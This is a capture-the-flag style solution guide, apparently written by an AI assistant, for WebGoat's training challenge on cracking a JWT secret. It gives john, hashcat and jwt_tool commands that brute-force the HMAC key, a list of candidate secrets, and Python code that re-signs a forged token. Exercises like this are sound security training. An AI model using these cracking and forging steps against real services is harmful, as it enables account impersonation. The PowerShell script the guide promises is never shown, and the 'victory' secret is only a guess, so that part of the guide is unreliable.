================================================================================
  JWT CHALLENGE 2: SECRET KEY CRACKING - SOLUTION
  WebGoat JWT Token Builder Challenge
================================================================================

TARGET TOKEN:
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2NTY5NzEzMCwiZXhwIjoxNzY1Njk3MTkwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.uysiK5my0-TITQRNe7kE2qjXXKytMC1TrMiwVIBOj_E

DECODED PAYLOAD:
{
  "iss": "WebGoat Token Builder",
  "aud": "webgoat.org",
  "iat": 1765697130,
  "exp": 1765697190,
  "sub": "tom@webgoat.org",
  "username": "Tom",
  "Email": "tom@webgoat.org",
  "Role": ["Manager", "Project Administrator"]
}

GOAL: 
1. Crack the secret key (brute force)
2. Change username: "Tom" → "WebGoat"
3. Sign new token with found secret
4. Submit to WebGoat

================================================================================
  METHOD 1: USE JOHN THE RIPPER (FASTEST)
================================================================================

STEP 1: Install john (if not already installed)
------------------------------------------------
# Windows (using chocolatey)
choco install john

# Or download from: https://www.openwall.com/john/

STEP 2: Create JWT file
------------------------
# Save token to file
echo eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2NTY5NzEzMCwiZXhwIjoxNzY1Njk3MTkwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.uysiK5my0-TITQRNe7kE2qjXXKytMC1TrMiwVIBOj_E > jwt.txt

STEP 3: Crack with john
------------------------
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# Or with custom wordlist
john jwt.txt --format=HMAC-SHA256

STEP 4: Show cracked password
------------------------------
john --show jwt.txt

================================================================================
  METHOD 2: USE HASHCAT (POWERFUL)
================================================================================

STEP 1: Install hashcat
------------------------
# Windows: Download from https://hashcat.net/hashcat/

STEP 2: Crack the secret
-------------------------
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Mode 16500 = JWT (JSON Web Token)
# -a 0 = Dictionary attack

================================================================================
  METHOD 3: USE JWT_TOOL (PYTHON - EASIEST)
================================================================================

STEP 1: Install jwt_tool
-------------------------
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install -r requirements.txt

STEP 2: Crack the secret
-------------------------
python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2NTY5NzEzMCwiZXhwIjoxNzY1Njk3MTkwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.uysiK5my0-TITQRNe7kE2qjXXKytMC1TrMiwVIBOj_E -C -d wordlist.txt

# -C = Crack mode
# -d = Dictionary file

STEP 3: Try common WebGoat secrets first
-----------------------------------------
python jwt_tool.py TOKEN -C -d /path/to/webgoat-secrets.txt

================================================================================
  METHOD 4: ONLINE JWT CRACKER
================================================================================

Option A: jwt.io
----------------
1. Go to https://jwt.io
2. Paste token in "Encoded" section
3. Try common secrets manually in "Verify Signature" section

Option B: jwt cracker online
-----------------------------
1. Search for "JWT cracker online"
2. Paste token
3. Let it try common secrets

================================================================================
  METHOD 5: POWERSHELL BRUTE FORCE (BUILT-IN)
================================================================================

I'll create a PowerShell script for you that:
1. Tests WebGoat-specific secrets
2. Tests common secrets
3. Signs new token when found

See: jwt_crack_and_sign.ps1 (creating now...)

================================================================================
  COMMON WEBGOAT SECRETS TO TRY
================================================================================

Based on WebGoat patterns, try these first:

1. webgoat
2. WebGoat
3. WEBGOAT
4. victory
5. defeating
6. shipping
7. deletingTom
8. password
9. secret
10. 123456
11. webgoat123
12. token
13. jwt
14. builder
15. WebGoatTokenBuilder
16. tokenbuilder

================================================================================
  MOST LIKELY SECRET FOR THIS CHALLENGE
================================================================================

Based on the token issuer "WebGoat Token Builder", likely secrets:
- victory (common in WebGoat JWT lessons)
- WebGoat
- tokenbuilder
- webgoat

TRY THESE FIRST!

================================================================================
  AFTER FINDING SECRET: CREATE NEW TOKEN
================================================================================

Once you find the secret (let's say it's "victory"):

OPTION A: Use jwt.io
--------------------
1. Go to https://jwt.io
2. Paste original token
3. In PAYLOAD section, change: "username": "Tom" → "username": "WebGoat"
4. In "Verify Signature" section, enter the found secret
5. Copy the new token from "Encoded" section
6. Submit to WebGoat

OPTION B: Use PowerShell (I'll create script)
----------------------------------------------
Run the script I'm creating below with:
- Secret: [FOUND_SECRET]
- Change username to: WebGoat

OPTION C: Use Python with PyJWT
--------------------------------
pip install pyjwt

python script:
import jwt

payload = {
  "iss": "WebGoat Token Builder",
  "aud": "webgoat.org",
  "iat": 1765697130,
  "exp": 1765697190,
  "sub": "tom@webgoat.org",
  "username": "WebGoat",
  "Email": "tom@webgoat.org",
  "Role": ["Manager", "Project Administrator"]
}

secret = "victory"  # Use the secret you found
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)

================================================================================
  QUICK START (RECOMMENDED)
================================================================================

1. Try common secrets manually first (fastest):
   - Run the PowerShell script I'm creating
   - It will test WebGoat-specific secrets
   - When found, it generates the new token automatically

2. If that fails, use jwt_tool (most reliable):
   - Install Python and jwt_tool
   - Run with WebGoat wordlist
   - Should find secret in seconds

3. Use online tools (easiest, no install):
   - Go to jwt.io
   - Try secrets manually
   - Sign new token when found

================================================================================
  EXPECTED OUTPUT
================================================================================

When secret is found:
"SECRET FOUND: victory"

New token will look like:
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2NTY5NzEzMCwiZXhwIjoxNzY1Njk3MTkwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0Lm9yZyIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.NEW_SIGNATURE_HERE

Submit this token to WebGoat challenge page.

================================================================================
  TROUBLESHOOTING
================================================================================

Error: "Not a valid JWT token"
- Make sure token is complete (no spaces, line breaks)
- Should have exactly 2 dots
- Should start with eyJ

Error: "JWT signature does not match"
- You're using wrong secret
- Try more secrets from wordlist
- Make sure algorithm is HS256 (not RS256 or none)

Error: Token expired
- May need to update "iat" and "exp" timestamps
- Use current Unix timestamp

================================================================================
